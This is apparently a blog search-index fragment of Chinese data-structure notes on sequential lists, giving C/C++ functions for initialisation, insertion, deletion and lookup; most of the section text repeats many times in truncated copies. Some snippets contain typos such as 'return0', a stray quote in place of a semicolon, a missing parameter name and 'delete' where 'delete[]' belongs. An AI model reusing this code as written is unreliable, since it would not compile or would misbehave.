} 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i\u003cL.length;i++) if(L.elem[i]==e) return i+1; return0; } 顺序表的插入 插入位置在最后 插入位置在中间 插入位置在最前面 ​ 线性表的插入运算是指在表的第i（1\u003c=i\u003c=n+1）个位置上，插入一个新结点e，使长度n的线性表（a1,…,ai-1,ai,…,an）变成长度为n+1的线性表（a1,…ai-1,e,ai,…an） ​ 算法思想： 1)判断插入位置i是否合法 2)判断顺序表的存储空间是否已满，若已满返回ERROR 3)将第n至第i位的元素以此向后移动一个位置，空出第i个位置 4)将要插入的新元素e放入第i个位置 5)表长加1，插入成功返回OK Status ListInsert_Sq(SqList \u0026L,int i,ElemType e){ if(i\u003c1 || i\u003eL.length+1)return ERROR; if(L.length==MAXSIZE)return ERROR; for(j=L.length-1 ;j\u003e=i-1 ;j--) L.elem[j+1]=L.elem[j]; L.elem[i-1]=e; L.length++; return OK; } 顺序表的删除 ​ 线性表的删除运算是指将表的第i（1\u003c=i\u003c=n）个结点删除，使长度为n的线性表变成长度为n-1的线性表 ​ 算法思想： 1)判断删除位置i是否合法 2)将欲删除的元素保留在e中 3)将第i+1至第n位的元素以此向前移动一个位置 4)表长减1，删除成功返回OK Status ListDelete_Sq(SqList \u0026L,int i){ if((i\u003c1)||(i\u003eL.length)) return ERROR; for(j=i;j\u003c=L.length-1;j++) L.elem[j-1]=L.elem[j]' L.length--; return OK; } 顺序表算法分析 时间复杂度 查找，插入，删除算法的平均时间复杂度为O(n) 空间复杂度 顺序表操作算法的空间复杂度S(n)=O(1) 顺序表优缺点优点： 存储密度大 可以随机存取表中任一元素 缺点： 在插入、删除某一元素时，需要移动大量元素 浪费存储空间 属于静态存储形式，数据元素的个数不能自由扩充 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#3顺序表示和实现"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序表的描述"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#静态数组"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#动态数组"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#多项式的顺序存储结构类型定义"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#传值方式"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#指针变量作参数"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#数组名作参数"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#引用类型作参数"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#补充预定义常量和类型"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序表基本操作的实现"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 } 求线性表L长度 int GetLength(SqList L){ return(L.length) } 判断线性表L是否为空 int IsEmpty(SqList){ if(L.length==0)return 1; else return 0; } 顺序表的取值（根据位置i获取相应位置数据元素的内容） int GetElem(SqList L,int i,ElemType \u0026e){ if(i\u003c1||i\u003eL.length) return ERROR; //判断合理性 e=L.elem[i-1]; return OK; } 顺序表的查找 在线性表L中查找与指定值e相同的数据元素的位置 从表的一段开始，逐个进行记录的关键字和给定值的比较。找到，返回该元素位置序号，未找到，返回0 平均查找长度ASL：为确定记录在表中的位置，需要与给定值进行比较的关键字的个数的期望值 int LocateElem(SqList L,ElemType e){ for(i=0;i","date":"2023-12-19","objectID":"/data_structure_notes/:2:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序表算法分析"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 